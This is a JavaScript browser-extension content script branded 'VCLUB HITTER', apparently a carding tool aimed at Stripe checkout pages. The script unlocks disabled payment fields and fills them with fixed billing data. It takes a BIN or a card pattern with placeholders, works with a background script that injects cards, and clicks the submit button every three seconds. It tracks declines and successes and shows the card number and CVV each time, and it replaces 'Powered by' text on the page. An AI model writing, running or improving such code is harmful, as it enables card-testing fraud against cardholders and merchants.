// VCLUB HITTER Script with Enhanced Notifications
(function () {
  if (window.stripeHelperInjected) return;
  window.stripeHelperInjected = true;

  const config = {
    urls: [
      'cs_live',
      'buy.stripe.com', 
      'api.stripe.com', 
      'invoice.stripe.com', 
      'checkout.stripe.com',
      'checkout.', 
      'billing.',  
      'invoice.',
      'payment.',
      'pay.',
      'secure.'
    ],
    fields: {
      billingName: 'input[name="billingName"], input[name="name"], input[autocomplete*="name"]',
      addressLine1: 'input[name="billingAddressLine1"], input[name="addressLine1"], input[autocomplete*="address-line1"]',
      addressLine2: 'input[name="billingAddressLine2"], input[name="addressLine2"], input[autocomplete*="address-line2"]',
      city: 'input[name="billingLocality"], input[name="city"], input[autocomplete*="city"]',
      country: 'select[name="billingCountry"], select[name="country"], select[autocomplete*="country"]',
      state: 'input[name="billingAdministrativeArea"], select[name="state"], select[autocomplete*="state"]',
      postalCode: 'input[name="billingPostalCode"], input[name="postalCode"], input[autocomplete*="postal-code"]',
      cardNumber: 'input[name="cardNumber"], input[name*="card"], input[data-elements-stable-field-name*="cardNumber"], input[aria-label*="card"], input[placeholder*="card"], iframe[name*="card"], [data-fieldtype="number"]',
      cardExpiry: 'input[name="cardExpiry"], input[name*="expir"], input[data-elements-stable-field-name*="cardExpiry"], input[aria-label*="expir"], input[placeholder*="MM"], iframe[name*="expir"], [data-fieldtype="expiry"]',
      cardCvc: 'input[name="cardCvc"], input[name*="cvc"], input[name*="cvv"], input[data-elements-stable-field-name*="cardCvc"], input[aria-label*="CVC"], input[placeholder*="CVC"], iframe[name*="cvc"], [data-fieldtype="cvc"]',
      email: 'input[type="email"], input[name="email"], input[autocomplete*="email"]'
    }
  };

  class StripeHelper {
    constructor() {
      this.isVisible = false;
      this.isRunning = false;
      this.binInput = '';
      this.emailInput = '';
      this.retryInterval = null;
      this.cardAttempts = 0;
      this.totalAttempts = 0;
      this.successCount = 0;
      this.cardDetails = null;
      this.lastActionTime = null;
      this.init();
    }

    async loadStorage() {
      return new Promise((resolve) => {
        chrome.storage.local.get(['bin', 'email'], (result) => {
          this.binInput = result.bin || '';
          this.emailInput = result.email || '';
          resolve();
        });
      });
    }

    toggleStartStop() {
      this.isRunning = !this.isRunning;
      this.lastActionTime = new Date();

      if (this.isRunning) {
        this.fillAndUnlockFields();
        this.startAutoRetry();
        this.showNotification('🚀 PROCESS STARTED', 'Auto-retry enabled • Fields filled & unlocked', 'success');
      } else {
        this.stopAutoRetry();
        this.showNotification('⏹️ PROCESS STOPPED', 'Auto-retry disabled', 'info');
      }

      this.updateStartStopButton();
    }

    updateStartStopButton() {
      if (this.startStopButton) {
        if (this.isRunning) {
          this.startStopButton.innerHTML = '⏹️ STOP';
          this.startStopButton.style.background = 'linear-gradient(145deg, #1e1e2d 0%, #2a2a3a 100%)';
        } else {
          this.startStopButton.innerHTML = '▶️ START';
          this.startStopButton.style.background = 'linear-gradient(145deg, #1e1e2d 0%, #2a2a3a 100%)';
        }
      }
    }

    fillAndUnlockFields() {
      // Fixed address data with proper values
      const addressData = {
        name: 'Ｖᴄʟᴜʙ Ｔᴇᴄʜ',
        addressLine1: '123 Main Street',
        addressLine2: 'OK',
        city: 'Macao',
        country: 'MO',
        state: 'Macau',
        postalCode: '999078',
        cardNumber: '0000000000000000',
        cardExpiry: '12/32',
        cardCvc: '000',
        email: 'mrdaxxteam@gmail.com'
      };

      // Unlock all fields first
      const fields = document.querySelectorAll('input[disabled], select[disabled], input[readonly], select[readonly]');
      fields.forEach(field => {
        field.removeAttribute('disabled');
        field.removeAttribute('readonly');
      });

      // Fill iframes
      const iframes = document.querySelectorAll('iframe[name*="card"], iframe[name*="expir"], iframe[name*="cvc"]');
      iframes.forEach(iframe => {
        try {
          const input = iframe.contentDocument.querySelector('input');
          if (input) {
            if (iframe.name.includes('card')) {
              input.value = addressData.cardNumber;
            } else if (iframe.name.includes('expir')) {
              input.value = addressData.cardExpiry;
            } else if (iframe.name.includes('cvc')) {
              input.value = addressData.cardCvc;
            }
            input.dispatchEvent(new Event('input', { bubbles: true }));
            input.dispatchEvent(new Event('change', { bubbles: true }));
          }
        } catch (e) {
          // Silent fail for cross-origin iframes
        }
      });

      // Fill name field
      const nameFields = document.querySelectorAll(config.fields.billingName);
      nameFields.forEach(field => {
        field.value = addressData.name;
        field.dispatchEvent(new Event('input', { bubbles: true }));
        field.dispatchEvent(new Event('change', { bubbles: true }));
      });

      // Fill address fields
      const addressLine1Fields = document.querySelectorAll(config.fields.addressLine1);
      addressLine1Fields.forEach(field => {
        field.value = addressData.addressLine1;
        field.dispatchEvent(new Event('input', { bubbles: true }));
        field.dispatchEvent(new Event('change', { bubbles: true }));
      });

      const addressLine2Fields = document.querySelectorAll(config.fields.addressLine2);
      addressLine2Fields.forEach(field => {
        field.value = addressData.addressLine2;
        field.dispatchEvent(new Event('input', { bubbles: true }));
        field.dispatchEvent(new Event('change', { bubbles: true }));
      });

      const cityFields = document.querySelectorAll(config.fields.city);
      cityFields.forEach(field => {
        field.value = addressData.city;
        field.dispatchEvent(new Event('input', { bubbles: true }));
        field.dispatchEvent(new Event('change', { bubbles: true }));
      });

      const countryFields = document.querySelectorAll(config.fields.country);
      countryFields.forEach(field => {
        field.value = addressData.country;
        field.dispatchEvent(new Event('input', { bubbles: true }));
        field.dispatchEvent(new Event('change', { bubbles: true }));
      });

      const stateFields = document.querySelectorAll(config.fields.state);
      stateFields.forEach(field => {
        field.value = addressData.state;
        field.dispatchEvent(new Event('input', { bubbles: true }));
        field.dispatchEvent(new Event('change', { bubbles: true }));
      });

      const postalCodeFields = document.querySelectorAll(config.fields.postalCode);
      postalCodeFields.forEach(field => {
        field.value = addressData.postalCode;
        field.dispatchEvent(new Event('input', { bubbles: true }));
        field.dispatchEvent(new Event('change', { bubbles: true }));
      });

      // Fill email if set or use default
      const emailToUse = this.emailInput || addressData.email;
      const emailFields = document.querySelectorAll(config.fields.email);
      emailFields.forEach(field => {
        field.value = emailToUse;
        field.dispatchEvent(new Event('input', { bubbles: true }));
        field.dispatchEvent(new Event('change', { bubbles: true }));
      });

      // Fill card fields directly (non-iframe)
      const cardNumberFields = document.querySelectorAll('input[name="cardNumber"], input[data-elements-stable-field-name*="cardNumber"]');
      cardNumberFields.forEach(field => {
        field.value = addressData.cardNumber;
        field.dispatchEvent(new Event('input', { bubbles: true }));
        field.dispatchEvent(new Event('change', { bubbles: true }));
      });

      const cardExpiryFields = document.querySelectorAll('input[name="cardExpiry"], input[data-elements-stable-field-name*="cardExpiry"]');
      cardExpiryFields.forEach(field => {
        field.value = addressData.cardExpiry;
        field.dispatchEvent(new Event('input', { bubbles: true }));
        field.dispatchEvent(new Event('change', { bubbles: true }));
      });

      const cardCvcFields = document.querySelectorAll('input[name="cardCvc"], input[name*="cvc"], input[name*="cvv"]');
      cardCvcFields.forEach(field => {
        field.value = addressData.cardCvc;
        field.dispatchEvent(new Event('input', { bubbles: true }));
        field.dispatchEvent(new Event('change', { bubbles: true }));
      });
    }

    startAutoRetry() {
      this.retryInterval = setInterval(() => {
        const submitBtn = document.querySelector('.SubmitButton, button[type="submit"], input[type="submit"]');
        if (submitBtn) {
          this.lastActionTime = new Date();
          chrome.runtime.sendMessage({ type: 'user_clicked_submit' });
          submitBtn.click();
        }
      }, 3000);
    }

    stopAutoRetry() {
      if (this.retryInterval) {
        clearInterval(this.retryInterval);
        this.retryInterval = null;
      }
    }

    getTimeSinceLastAction() {
      if (!this.lastActionTime) return '0s';
      const seconds = Math.floor((new Date() - this.lastActionTime) / 1000);
      return `${seconds}s`;
    }

    // Enhanced Notification System - Moved to left side
    showNotification(title, message, type = 'info', cardData = null) {
      const notification = document.createElement('div');
      notification.className = 'stripe-helper-notification';
      
      const now = new Date();
      const timeString = now.toLocaleTimeString();
      const timeSinceAction = this.getTimeSinceLastAction();

      let icon = 'ℹ️';
      let borderColor = '#2196f3';
      
      switch(type) {
        case 'success':
          icon = '✅';
          borderColor = '#4CAF50';
          break;
        case 'error':
          icon = '❌';
          borderColor = '#f44336';
          break;
        case 'warning':
          icon = '⚠️';
          borderColor = '#ff9800';
          break;
        case 'card':
          icon = '💳';
          borderColor = '#9C27B0';
          break;
      }

      let cardHTML = '';
      if (cardData) {
        cardHTML = `
          <div class="card-details">
            <div class="card-row">
              <span class="label">Card:</span>
              <span class="value">${cardData.number}</span>
            </div>
            <div class="card-row">
              <span class="label">Exp:</span>
              <span class="value">${cardData.month}/${cardData.year}</span>
            </div>
            <div class="card-row">
              <span class="label">CVV:</span>
              <span class="value">${cardData.cvv}</span>
            </div>
          </div>
        `;
      }

      notification.innerHTML = `
        <div class="notification-header">
          <span class="notification-icon">${icon}</span>
          <span class="notification-title">${title}</span>
          <span class="notification-time">${timeString}</span>
        </div>
        <div class="notification-body">
          <div class="notification-message">${message}</div>
          ${cardHTML}
          <div class="notification-footer">
            <span class="time-since">${timeSinceAction} ago</span>
            <span class="attempt-count">Attempt: ${this.cardAttempts}</span>
          </div>
        </div>
      `;

      Object.assign(notification.style, {
        position: 'fixed',
        top: '20px',
        left: '20px',
        background: 'rgba(10, 10, 15, 0.95)',
        color: '#fff',
        padding: '12px',
        borderRadius: '6px',
        fontSize: '11px',
        zIndex: '1000000',
        boxShadow: '0 4px 12px rgba(0, 0, 0, 0.3)',
        border: `1px solid ${borderColor}`,
        backdropFilter: 'blur(5px)',
        fontFamily: 'Arial, sans-serif',
        minWidth: '280px',
        maxWidth: '320px',
        animation: 'slideInLeft 0.3s ease-out'
      });

      // Add CSS for animation
      if (!document.querySelector('#notification-styles')) {
        const style = document.createElement('style');
        style.id = 'notification-styles';
        style.textContent = `
          @keyframes slideInLeft {
            from {
              transform: translateX(-100%);
              opacity: 0;
            }
            to {
              transform: translateX(0);
              opacity: 1;
            }
          }
          
          .stripe-helper-notification {
            transition: all 0.3s ease;
          }
          
          .notification-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 6px;
            padding-bottom: 4px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
          }
          
          .notification-icon {
            font-size: 12px;
          }
          
          .notification-title {
            font-weight: bold;
            flex: 1;
            margin: 0 6px;
            font-size: 10px;
          }
          
          .notification-time {
            font-size: 9px;
            opacity: 0.7;
          }
          
          .notification-message {
            margin-bottom: 6px;
            line-height: 1.3;
            font-size: 10px;
          }
          
          .card-details {
            background: rgba(255, 255, 255, 0.05);
            padding: 6px;
            border-radius: 3px;
            margin: 6px 0;
            border-left: 2px solid #9C27B0;
          }
          
          .card-row {
            display: flex;
            justify-content: space-between;
            margin: 1px 0;
            font-size: 9px;
          }
          
          .card-row .label {
            font-weight: bold;
            color: #ccc;
          }
          
          .card-row .value {
            font-family: 'Courier New', monospace;
            color: #fff;
          }
          
          .notification-footer {
            display: flex;
            justify-content: space-between;
            margin-top: 6px;
            padding-top: 4px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            font-size: 8px;
            opacity: 0.8;
          }
          
          .time-since {
            color: #ff9800;
          }
          
          .attempt-count {
            color: #2196F3;
            font-weight: bold;
          }
        `;
        document.head.appendChild(style);
      }

      // Remove existing notifications
      const existingNotifications = document.querySelectorAll('.stripe-helper-notification');
      existingNotifications.forEach((notif, index) => {
        if (index > 1) {
          notif.remove();
        }
      });

      document.body.appendChild(notification);

      // Auto remove after 4 seconds
      setTimeout(() => {
        if (notification.parentNode) {
          notification.style.animation = 'slideInLeft 0.3s ease-out reverse';
          setTimeout(() => notification.remove(), 300);
        }
      }, 4000);
    }

    createButton(text, onClick, icon = '') {
      const button = document.createElement('button');
      Object.assign(button.style, {
        width: '100%',
        padding: '10px',
        margin: '6px 0',
        background: 'linear-gradient(145deg, #1e1e2d 0%, #2a2a3a 100%)',
        border: '1px solid rgba(255, 255, 255, 0.1)',
        borderRadius: '6px',
        color: '#fff',
        cursor: 'pointer',
        fontSize: '12px',
        fontWeight: '600',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        gap: '6px',
        transition: 'all 0.2s ease',
        boxShadow: '0 2px 4px rgba(0, 0, 0, 0.2)',
        userSelect: 'none',
        outline: 'none'
      });
      
      button.innerHTML = `<span style="display: flex; align-items: center; gap: 6px; font-size: 11px;">${icon} ${text}</span>`;

      button.addEventListener('mouseover', () => {
        button.style.background = 'linear-gradient(145deg, #2a2a3a 0%, #1e1e2d 100%)';
        button.style.transform = 'translateY(-1px)';
        button.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.3)';
      });

      button.addEventListener('mouseout', () => {
        button.style.background = 'linear-gradient(145deg, #1e1e2d 0%, #2a2a3a 100%)';
        button.style.transform = 'translateY(0)';
        button.style.boxShadow = '0 2px 4px rgba(0, 0, 0, 0.2)';
      });

      button.addEventListener('click', onClick);
      return button;
    }

    createBranding() {
      const branding = document.createElement('div');
      Object.assign(branding.style, {
        position: 'fixed',
        bottom: '10px',
        left: '10px',
        zIndex: '999999',
        color: '#fff',
        fontSize: '10px',
        fontWeight: '600',
        fontFamily: 'Arial, sans-serif',
        padding: '4px 6px',
        borderRadius: '3px',
        background: 'rgba(10, 10, 15, 0.9)',
        backdropFilter: 'blur(5px)',
        boxShadow: '0 2px 6px rgba(0, 0, 0, 0.2)',
        border: '1px solid rgba(255, 255, 255, 0.1)'
      });
      branding.textContent = 'VClub-Tech';
      document.body.appendChild(branding);
    }

    showCardDialog() {
      const dialog = document.createElement('div');
      Object.assign(dialog.style, {
        position: 'fixed',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        background: 'rgba(10, 10, 15, 0.95)',
        padding: '15px',
        borderRadius: '6px',
        zIndex: '1000001',
        boxShadow: '0 4px 12px rgba(0, 0, 0, 0.3)',
        border: '1px solid rgba(255, 255, 255, 0.1)',
        minWidth: '350px',
        backdropFilter: 'blur(5px)'
      });

      const title = document.createElement('div');
      title.textContent = '💳 SET CARD/BIN';
      title.style.cssText = 'font-weight: bold; margin-bottom: 10px; text-align: center; font-size: 11px; color: #fff;';

      const input = document.createElement('input');
      Object.assign(input.style, {
        width: '100%',
        padding: '8px',
        marginBottom: '10px',
        background: 'rgba(30, 30, 30, 0.9)',
        border: '1px solid rgba(255, 255, 255, 0.1)',
        borderRadius: '3px',
        color: '#fff',
        boxSizing: 'border-box',
        fontSize: '11px',
        outline: 'none'
      });
      input.value = this.binInput;
      input.placeholder = 'BIN (424242) or Full Card (4242424242424242|12|32|000)';
      
      input.addEventListener('focus', () => {
        input.style.borderColor = 'rgba(79, 195, 247, 0.6)';
      });

      input.addEventListener('blur', () => {
        input.style.borderColor = 'rgba(255, 255, 255, 0.1)';
      });

      // Format examples
      const examples = document.createElement('div');
      examples.style.cssText = 'font-size: 9px; color: #888; margin-bottom: 10px; line-height: 1.3; background: rgba(255,255,255,0.05); padding: 8px; border-radius: 4px;';
      examples.innerHTML = `
        <div style="font-weight: bold; margin-bottom: 4px;">📝 Supported Formats:</div>
        <div>• Full Card: <span style="color: #4caf50;">4242426300016633|05|30|000</span></div>
        <div>• With Placeholders: <span style="color: #2196f3;">42424263000xxxx|xx|xx|xx</span></div>
        <div>• Mixed Format: <span style="color: #2196f3;">4242426300016633|xx|xx|000</span></div>
        <div>• Simple BIN: <span style="color: #4caf50;">424242</span></div>
        <div>• BIN Pattern: <span style="color: #2196f3;">42424263xxxxxxxx</span></div>
      `;

      const buttonContainer = document.createElement('div');
      buttonContainer.style.cssText = 'display: flex; gap: 6px;';

      const saveButton = this.createButton('SAVE', () => {
        const binValue = input.value.trim();
        if (binValue) {
          chrome.storage.local.set({ bin: binValue }, () => {
            this.binInput = binValue;
            if (binValue.includes('|')) {
              this.showNotification('✅ CARD SAVED', 'Full card details configured', 'success');
            } else {
              this.showNotification('✅ BIN SAVED', `BIN: ${binValue} configured`, 'success');
            }
            dialog.remove();
          });
        } else {
          this.showNotification('❌ INVALID', 'Please enter BIN or full card', 'error');
        }
      });

      const cancelButton = this.createButton('CANCEL', () => {
        dialog.remove();
      });

      saveButton.style.margin = '0';
      cancelButton.style.margin = '0';
      cancelButton.style.background = 'linear-gradient(145deg, #f44336 0%, #d32f2f 100%)';

      buttonContainer.appendChild(saveButton);
      buttonContainer.appendChild(cancelButton);

      dialog.appendChild(title);
      dialog.appendChild(input);
      dialog.appendChild(examples);
      dialog.appendChild(buttonContainer);
      document.body.appendChild(dialog);
      input.focus();
      input.select();
    }

    showEmailDialog() {
      const dialog = document.createElement('div');
      Object.assign(dialog.style, {
        position: 'fixed',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        background: 'rgba(10, 10, 15, 0.95)',
        padding: '15px',
        borderRadius: '6px',
        zIndex: '1000001',
        boxShadow: '0 4px 12px rgba(0, 0, 0, 0.3)',
        border: '1px solid rgba(255, 255, 255, 0.1)',
        minWidth: '250px',
        backdropFilter: 'blur(5px)'
      });

      const title = document.createElement('div');
      title.textContent = '📧 SET EMAIL';
      title.style.cssText = 'font-weight: bold; margin-bottom: 10px; text-align: center; font-size: 11px; color: #fff;';

      const input = document.createElement('input');
      Object.assign(input.style, {
        width: '100%',
        padding: '8px',
        marginBottom: '10px',
        background: 'rgba(30, 30, 30, 0.9)',
        border: '1px solid rgba(255, 255, 255, 0.1)',
        borderRadius: '3px',
        color: '#fff',
        boxSizing: 'border-box',
        fontSize: '11px',
        outline: 'none'
      });
      input.value = this.emailInput;
      input.placeholder = 'Enter email address';
      input.type = 'email';
      
      input.addEventListener('focus', () => {
        input.style.borderColor = 'rgba(76, 175, 80, 0.6)';
      });

      input.addEventListener('blur', () => {
        input.style.borderColor = 'rgba(255, 255, 255, 0.1)';
      });

      const buttonContainer = document.createElement('div');
      buttonContainer.style.cssText = 'display: flex; gap: 6px;';

      const saveButton = this.createButton('SAVE', () => {
        const emailValue = input.value.trim();
        if (emailValue && emailValue.includes('@')) {
          chrome.storage.local.set({ email: emailValue }, () => {
            this.emailInput = emailValue;
            this.showNotification('✅ EMAIL SAVED', `Email: ${emailValue}`, 'success');
            dialog.remove();
          });
        } else {
          this.showNotification('❌ INVALID', 'Please enter valid email', 'error');
        }
      });

      const cancelButton = this.createButton('CANCEL', () => {
        dialog.remove();
      });

      saveButton.style.margin = '0';
      cancelButton.style.margin = '0';
      cancelButton.style.background = 'linear-gradient(145deg, #f44336 0%, #d32f2f 100%)';

      buttonContainer.appendChild(saveButton);
      buttonContainer.appendChild(cancelButton);

      dialog.appendChild(title);
      dialog.appendChild(input);
      dialog.appendChild(buttonContainer);
      document.body.appendChild(dialog);
      input.focus();
      input.select();
    }

    togglePanel() {
      this.isVisible = !this.isVisible;
      if (this.container) {
        this.container.style.right = this.isVisible ? '0px' : '-160px';
      }
      if (this.toggleBtn) {
        this.toggleBtn.textContent = this.isVisible ? '>' : '<';
      }
    }

    createInterface() {
      // Main container
      this.container = document.createElement('div');
      Object.assign(this.container.style, {
        position: 'fixed',
        top: '50%',
        right: '-160px',
        transform: 'translateY(-50%)',
        backgroundColor: 'rgba(10, 10, 15, 0.95)',
        padding: '10px',
        borderRadius: '6px 0 0 6px',
        boxShadow: '0 2px 10px rgba(0, 0, 0, 0.3)',
        border: '1px solid rgba(255, 255, 255, 0.1)',
        borderRight: 'none',
        backdropFilter: 'blur(5px)',
        transition: 'right 0.3s ease',
        width: '160px',
        zIndex: '999999'
      });

      // Toggle button
      this.toggleBtn = document.createElement('button');
      Object.assign(this.toggleBtn.style, {
        position: 'absolute',
        left: '-20px',
        top: '50%',
        transform: 'translateY(-50%)',
        background: 'rgba(10, 10, 15, 0.95)',
        border: '1px solid rgba(255, 255, 255, 0.1)',
        borderRight: 'none',
        borderRadius: '4px 0 0 4px',
        color: '#fff',
        cursor: 'pointer',
        fontSize: '10px',
        padding: '15px 4px',
        writingMode: 'vertical-rl',
        textOrientation: 'mixed',
        zIndex: '1000000'
      });
      this.toggleBtn.textContent = '<';
      this.toggleBtn.onclick = () => this.togglePanel();

      const title = document.createElement('div');
      title.textContent = 'VCLUB HITTER';
      title.style.cssText = 'font-weight: bold; text-align: center; margin-bottom: 10px; font-size: 11px; color: #4fc3f7;';

      const cardButton = this.createButton('💳 SET CARD/BIN', () => this.showCardDialog());
      const emailButton = this.createButton('📧 SET EMAIL', () => this.showEmailDialog());
      this.startStopButton = this.createButton('▶️ START', () => this.toggleStartStop());
      
      // Apply initial styles
      this.updateStartStopButton();

      this.container.appendChild(title);
      this.container.appendChild(cardButton);
      this.container.appendChild(emailButton);
      this.container.appendChild(this.startStopButton);
      this.container.appendChild(this.toggleBtn);

      document.body.appendChild(this.container);
      this.createBranding();
    }

    async init() {
      if (!config.urls.some(url => window.location.href.includes(url))) return;

      await this.loadStorage();

      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => this.createInterface());
      } else {
        this.createInterface();
      }

      // Listen for messages from background script
      chrome.runtime.onMessage.addListener((message) => {
        this.lastActionTime = new Date();

        if (message.type === 'card_injected') {
          this.cardDetails = message.card;
          this.cardAttempts = message.cardAttempts || 0;
          this.totalAttempts = message.totalAttempts || 0;
          
          this.showNotification(
            'CARD INJECTED', 
            `Card details filled successfully`, 
            'card',
            this.cardDetails
          );
        }
        else if (message.type === 'payment_response') {
          this.cardAttempts = message.cardAttempts || this.cardAttempts;
          this.totalAttempts = message.totalAttempts || this.totalAttempts;
          this.successCount = message.successCount || this.successCount;
          
          if (message.response.success) {
            this.showNotification(
              'PAYMENT SUCCESS', 
              `Payment processed successfully`, 
              'success'
            );
          } else {
            this.showNotification(
              'PAYMENT DECLINED', 
              `${message.response.message}`, 
              'error'
            );
          }
        }
      });
    }
  }

  // Initialize VCLUB HITTER if on a Stripe-related page
  if (config.urls.some(url => window.location.href.includes(url))) {
    new StripeHelper();
  }

  // Text replacement for "Powered by"
  document.addEventListener('DOMContentLoaded', () => {
    const replaceTextInDOM = () => {
      const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
      let node;
      while (node = walker.nextNode()) {
        if (node.nodeValue.includes('Powered by')) {
          node.nodeValue = node.nodeValue.replace(/Powered by/g, "VClub-Tech");
        }
      }
    };

    replaceTextInDOM();

    const observer = new MutationObserver(replaceTextInDOM);
    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  });
})();